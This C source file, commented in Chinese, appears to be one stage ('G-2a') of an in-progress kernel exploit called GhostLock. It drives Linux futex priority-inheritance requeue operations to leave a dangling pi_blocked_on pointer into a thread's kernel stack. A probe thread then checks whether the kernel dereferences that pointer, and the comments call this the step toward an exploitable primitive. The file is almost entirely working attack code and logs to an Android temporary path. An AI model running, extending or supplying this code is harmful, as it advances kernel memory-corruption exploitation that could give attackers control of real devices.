/*
 * g2_deref.c — GhostLock G-2a：验证悬垂 pi_blocked_on 是否被真正解引用
 *
 * 前序（G-1 已 4/4 命中）：CMP_REQUEUE_PI 的 -EDEADLK 回滚使
 *   remove_waiter() 在 R 的上下文执行，W->pi_blocked_on 保持指向
 *   W 内核栈上的 rt_waiter（已从 C 的等待队列摘下，锁字段仍为 C）。
 *
 * 本步判据（干净二分）：
 *   让第三个线程 X 以 500 ms 超时对 B 做 FUTEX_LOCK_PI（B 由 W 持有）
 *     - 若悬垂指针被解引用：链走查 B →(W 阻塞于)C →(O 持有)→ O 阻塞于 B → 成环
 *       → 返回 -1 / EDEADLK(35)
 *     - 若未被解引用（pi_blocked_on 已被正常清空）：X 只是正常入队等待
 *       → 返回 -1 / ETIMEDOUT(110)
 *
 * 意义：EDEADLK 即证明"用户可控栈上的 waiter 正在参与内核 PI 链计算"，
 *       这是 GhostLock 从"状态损坏"走向"可利用原语"的关键一步。
 *
 * 风险：链走查涉及的结构（C、O、B）此时均有效，预期不会崩；
 *       仍按最坏情况处理：每步 fsync、结束即 _exit、不做任何清理性 PI 操作。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define LOGPATH "/data/local/tmp/g2.log"

#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_UNLOCK_PI       7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A;
	uint32_t C;
	uint32_t B;
	volatile int b_held;
	volatile int c_held;
	volatile int o_blocked;
	volatile int w_waiting;
	volatile int go_probe;
	volatile int x_done;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;

	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();

	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");

	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;

	(void)arg;
	/*
	 * 关键：降低 O 的调度优先级，使后面探针线程 X 在 B 上成为 top waiter。
	 * 否则 FIFO 下 O 的 waiter 占住 top 位置，task_blocks_on_rt_mutex 的
	 * 链走查分支（owner->pi_blocked_on）不会被触发，探针无意义。
	 */
	errno = 0;
	if (setpriority(PRIO_PROCESS, 0, 19) == 0)
		lg("O: setpriority(19) OK（使 X 能成为 B 的 top waiter）");
	else
		lg("O: setpriority 失败 errno=%d (%s)", errno, strerror(errno));

	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();

	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");

	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

/* 探针线程 X：带 500ms 超时地尝试 LOCK_PI(B) */
static void *thread_x(void *arg)
{
	struct timespec ts;
	long r;

	(void)arg;
	while (!S->go_probe)
		__asm__ __volatile__("" ::: "memory");

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 0;
	ts.tv_nsec += 500 * 1000 * 1000;
	if (ts.tv_nsec >= 1000000000L) {
		ts.tv_sec += 1;
		ts.tv_nsec -= 1000000000L;
	}

	lg("X: 进入 LOCK_PI(B)（500ms 超时）");
	errno = 0;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	lg("X: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && errno == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 已被解引用（W 的栈上 waiter 参与了 PI 链）");
	else if (r == -1 && errno == ETIMEDOUT)
		lg("verdict: 未解引用（X 正常阻塞至超时）→ 悬垂指针未被使用");
	else if (r == 0)
		lg("verdict: 意外取得 B（errno=%d）", errno);
	else
		lg("verdict: 其他 errno=%d (%s)", errno, strerror(errno));
	S->x_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tx;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2a start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->B = S->C = 0;

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);

	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("R: CMP_REQUEUE_PI(A→C, 1) —— 建立损坏状态");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	if (!(r == -1 && e == EDEADLK)) {
		lg("前置条件未达成（未进入 -EDEADLK），终止");
		sync_log();
		_exit(2);
	}
	lg("前置达成：W->pi_blocked_on 应已悬垂，W 仍阻塞于 A");
	sync_log();

	/* 启动探针线程 */
	pthread_create(&tx, NULL, thread_x, NULL);
	S->go_probe = 1;
	__sync_synchronize();

	/* 等探针完成（最多 3s） */
	{
		int spin = 0;
		while (!S->x_done && spin < 3000) {
			usleep(1000);
			spin++;
		}
		if (!S->x_done)
			lg("探针未在 3s 内返回（X 可能仍阻塞）");
	}
	usleep(200000);

	lg("结束（不做清理性 PI 操作）");
	sync_log();
	_exit(0);
}
